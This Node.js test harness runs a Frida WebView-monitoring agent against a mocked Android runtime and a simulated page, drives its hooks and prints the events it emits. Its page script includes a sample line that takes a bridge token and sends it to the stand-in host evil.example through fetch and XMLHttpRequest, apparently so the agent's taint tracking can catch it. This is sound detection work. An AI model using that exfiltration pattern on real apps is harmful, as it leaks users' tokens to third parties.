// Test harness: run the Frida agent (legacy two-script load, or the bundle) against a mocked Java runtime
// and a simulated page, drive every hook family, and print the emitted events.
// Usage: node native_harness.js legacy <webview.js> <getenv.js>
//        node native_harness.js bundle <agent.js>
//        node native_harness.js static <agent.js>   (bundle scenario, then a call to a statically hooked,
//                                                   never-registered bridge method com.example.Hidden.deleteAll)
"use strict";

const fs = require("fs");
const vm = require("vm");

const [mode, ...paths] = process.argv.slice(2);
const output = [];
const results = {};
let intervalFn = null;
let hashSeq = 100;

// ---- mocked Java runtime ---------------------------------------------------------------------
const classes = {};
const STATIC = {
  "java.lang.reflect.Modifier": { isPublic: () => true },
  "java.lang.String": { $new: (value) => String(value) },
};
const RETVALS = {
  "com.example.Bridge.getToken": () => "tok-123-secret",
  "com.example.Bridge.ping": () => "pong",
  "java.lang.System.getenv": (key) => (key === "HOME" ? "/home/app" : null),
};

function makeMethod(className, name) {
  const overloads = {};
  const method = function (...args) {
    if (STATIC[className] && STATIC[className][name]) return STATIC[className][name](...args);
    const fn = RETVALS[`${className}.${name}`];
    return fn ? fn(...args) : undefined;
  };
  const makeOverload = (types) => {
    const key = types.join(",");
    if (!overloads[key]) {
      const original = function (...args) {
        const fn = RETVALS[`${className}.${name}`];
        return fn ? fn(...args) : undefined;
      };
      original.argumentTypes = types.map((t) => ({ className: t }));
      original.implementation = null;
      overloads[key] = original;
    }
    return overloads[key];
  };
  method.overload = (...types) => makeOverload(types);
  Object.defineProperty(method, "overloads", {
    get() {
      if (Object.keys(overloads).length === 0) makeOverload(["boolean"]);
      return Object.values(overloads);
    },
  });
  method.find = (types) => makeOverload(types);
  return method;
}

function use(className) {
  if (!classes[className]) {
    const methods = {};
    const target = { $className: className };
    classes[className] = new Proxy(target, {
      get(obj, prop) {
        if (prop in obj) return obj[prop];
        if (typeof prop === "symbol") return undefined;
        if (prop === "class") return { $className: className, marker: true };
        if (!methods[prop]) methods[prop] = makeMethod(className, prop);
        return methods[prop];
      },
    });
    if (className === "android.webkit.WebView") {
      classes[className].$init.overload("android.content.Context");
      classes[className].$init.overload("android.content.Context", "android.util.AttributeSet");
    }
  }
  return classes[className];
}

function impl(className, name, types) {
  const method = use(className)[name];
  const overload = types ? method.overload(...types) : method;
  if (!overload.implementation) throw new Error(`no hook on ${className}.${name}(${types || ""})`);
  return overload.implementation;
}

const Java = {
  perform(fn) { fn(); },
  use,
  retain(x) { return x; },
  cast(x) { return x; },
  scheduleOnMainThread(fn) { fn(); },
  registerClass(spec) {
    return { $new: () => ({ onReceiveValue: spec.methods.onReceiveValue }) };
  },
};

// ---- fake Java objects -----------------------------------------------------------------------
function javaObject(className, extra = {}) {
  const hash = hashSeq++;
  return Object.assign(
    {
      $className: className,
      hashCode: () => hash,
      getClass: () => ({ getName: () => className }),
      toString: () => `${className}@${hash.toString(16)}`,
    },
    extra,
  );
}

function makePage() {
  const page = vm.createContext({});
  vm.runInContext(
    `
    var window = globalThis;
    window.fetch = function fetch(url) { return "fetched"; };
    window.open = function open(url) { return null; };
    window.postMessage = function postMessage(message, origin) {};
    window.navigator = { sendBeacon: function sendBeacon(url, data) { return true; } };
    function Location() { this.href = "https://app.example/"; }
    Location.prototype.assign = function assign(url) {};
    Location.prototype.replace = function replace(url) {};
    window.Location = Location;
    window.location = new Location();
    function XMLHttpRequest() {}
    XMLHttpRequest.prototype.open = function open(method, url) {};
    XMLHttpRequest.prototype.send = function send(body) {};
    window.XMLHttpRequest = XMLHttpRequest;
    function Storage() { this._values = new Map(); }
    Storage.prototype.setItem = function setItem(key, value) { this._values.set(String(key), String(value)); };
    Storage.prototype.getItem = function getItem(key) {
      return this._values.has(String(key)) ? this._values.get(String(key)) : null;
    };
    window.Storage = Storage;
    window.localStorage = new Storage();
    `,
    page,
  );
  return page;
}

const settings = javaObject("android.webkit.WebSettings");
const page = makePage();
const evaluated = [];
const view = javaObject("android.webkit.WebView", {
  getSettings: () => settings,
  setWebViewClient() {},
  setWebChromeClient() {},
  loadUrl() {},
  postUrl() {},
  loadData() {},
  loadDataWithBaseURL() {},
  addJavascriptInterface() {},
  evaluateJavascript(script, callback) {
    const text = String(script);
    evaluated.push(text.length);
    let value;
    try {
      value = vm.runInContext(text, page);
    } catch (e) {
      value = null;
    }
    if (callback && callback.onReceiveValue) callback.onReceiveValue(JSON.stringify(value === undefined ? null : value));
  },
});
const client = javaObject("com.example.Client");
const chromeClient = javaObject("com.example.Chrome");
const bridgeMethod = (name, params, annotated) => ({
  getName: () => name,
  getParameterTypes: () => params.map((p) => ({ getName: () => p })),
  getModifiers: () => 1,
  isAnnotationPresent: () => annotated,
  toString: () => `public java.lang.String com.example.Bridge.${name}(${params.join(",")})`,
});
const bridge = javaObject("com.example.Bridge", {
  class: {
    getMethods: () => [
      bridgeMethod("getToken", [], true),
      bridgeMethod("ping", ["java.lang.String"], true),
      bridgeMethod("hidden", [], false),
      bridgeMethod("getToken", [], true),
    ],
  },
});
const permissionRequest = javaObject("android.webkit.PermissionRequest", {
  getOrigin: () => ({ toString: () => "https://app.example/" }),
  getResources: () => ["android.webkit.resource.VIDEO_CAPTURE"],
});
const webRequest = javaObject("android.webkit.WebResourceRequest", {
  getUrl: () => ({ toString: () => "https://app.example/api" }),
});

// ---- load the agent --------------------------------------------------------------------------
function loadScript(path) {
  const context = vm.createContext({
    Java,
    console: { log: (line) => output.push(line) },
    setInterval: (fn) => { intervalFn = fn; },
  });
  vm.runInContext("Math.random = () => 0.5;", context);
  vm.runInContext(fs.readFileSync(path, "utf8"), context, { filename: path });
}

if (mode === "legacy") {
  loadScript(paths[0]);
  loadScript(paths[1]);
} else {
  loadScript(paths[0]);
}

// ---- drive every hook family -----------------------------------------------------------------
const W = "android.webkit.WebView";
impl(W, "$init", ["android.content.Context"]).call(view, "ctx");
impl(W, "getSettings").call(view);
for (const [setter, value] of [
  ["setJavaScriptEnabled", true],
  ["setAllowFileAccess", true],
  ["setMixedContentMode", 0],
  ["setSafeBrowsingEnabled", false],
]) {
  use("android.webkit.WebSettings")[setter].overloads[0].implementation.call(settings, value);
}
impl(W, "setWebViewClient", ["android.webkit.WebViewClient"]).call(view, client);
impl(W, "setWebChromeClient", ["android.webkit.WebChromeClient"]).call(view, chromeClient);
impl(W, "loadUrl", ["java.lang.String"]).call(view, "http://remote.example/page");
impl(W, "loadUrl", ["java.lang.String", "java.util.Map"]).call(view, "https://app.example/", { h: "v" });
impl(W, "postUrl", ["java.lang.String", "[B"]).call(view, "https://app.example/post", [1, 2, 3]);
impl(W, "loadData", ["java.lang.String", "java.lang.String", "java.lang.String"]).call(view, "<b>x</b>", "text/html", "utf-8");
impl(W, "loadDataWithBaseURL", ["java.lang.String", "java.lang.String", "java.lang.String", "java.lang.String", "java.lang.String"])
  .call(view, "https://base.example/", "<i>y</i>", "text/html", "utf-8", null);

const C = "com.example.Client";
const VS = ["android.webkit.WebView", "java.lang.String"];
const VR = ["android.webkit.WebView", "android.webkit.WebResourceRequest"];
impl(C, "onPageFinished", VS).call(client, view, "http://remote.example/page");
impl(C, "onLoadResource", VS).call(client, view, "http://remote.example/style.css");
impl(C, "shouldOverrideUrlLoading", VS).call(client, view, "https://app.example/next");
impl(C, "shouldOverrideUrlLoading", VR).call(client, view, webRequest);
impl(C, "shouldInterceptRequest", VS).call(client, view, "https://cdn.example/a.js");
impl(C, "shouldInterceptRequest", VR).call(client, view, webRequest);
impl(C, "onPageFinished", VS).call(client, view, "http://remote.example/page");

const R = "com.example.Chrome";
impl(R, "onPermissionRequest", ["android.webkit.PermissionRequest"]).call(chromeClient, permissionRequest);
impl(R, "onGeolocationPermissionsShowPrompt", ["java.lang.String", "android.webkit.GeolocationPermissions$Callback"])
  .call(chromeClient, "http://remote.example/", javaObject("android.webkit.GeolocationPermissions$Callback"));
impl("android.webkit.PermissionRequest", "grant", ["[Ljava.lang.String;"]).call(permissionRequest, ["android.webkit.resource.VIDEO_CAPTURE"]);
impl("android.webkit.PermissionRequest", "deny", []).call(permissionRequest);

impl(W, "addJavascriptInterface", ["java.lang.Object", "java.lang.String"]).call(view, bridge, "AppBridge");
impl(W, "evaluateJavascript", ["java.lang.String", "android.webkit.ValueCallback"]).call(view, "app.start()", null);

// expose the bridge to the page; calls go through the hooked Java methods
page.__callBridge = (name, args) => impl("com.example.Bridge", name, name === "ping" ? ["java.lang.String"] : []).apply(bridge, args);
vm.runInContext(
  `window.AppBridge = {
     getToken: function getToken() { return __callBridge("getToken", []); },
     ping: function ping(x) { return __callBridge("ping", [x]); },
   };`,
  page,
);

results.getenvUrl = impl("java.lang.System", "getenv", ["java.lang.String"]).call(use("java.lang.System"), "URL");
results.getenvHome = impl("java.lang.System", "getenv", ["java.lang.String"]).call(use("java.lang.System"), "HOME");

intervalFn(); // inject + wrap bridge + probe + flush
vm.runInContext(
  `var t = AppBridge.getToken();
   AppBridge.ping("hello");
   localStorage.setItem("k", t);
   fetch("http://evil.example/?t=" + t);
   new XMLHttpRequest().open("GET", "http://evil.example/x");
   window.eval("2 + 2");`,
  page,
);
intervalFn(); // probe page events + flush
if (mode === "static") {
  results.staticCall = impl("com.example.Hidden", "deleteAll", []).call(javaObject("com.example.Hidden")) ?? null;
}
intervalFn(); // empty tick

results.evaluatedScripts = evaluated.length;
const normalized = output
  .map((line) =>
    line
      .replace(/"timestamp":"[^"]+"/g, '"timestamp":"T"')
      .replace(/taint-\d+-\d+/g, "taint-N"),
  )
  .sort();
process.stdout.write(JSON.stringify({ results, events: normalized }, null, 1) + "\n");
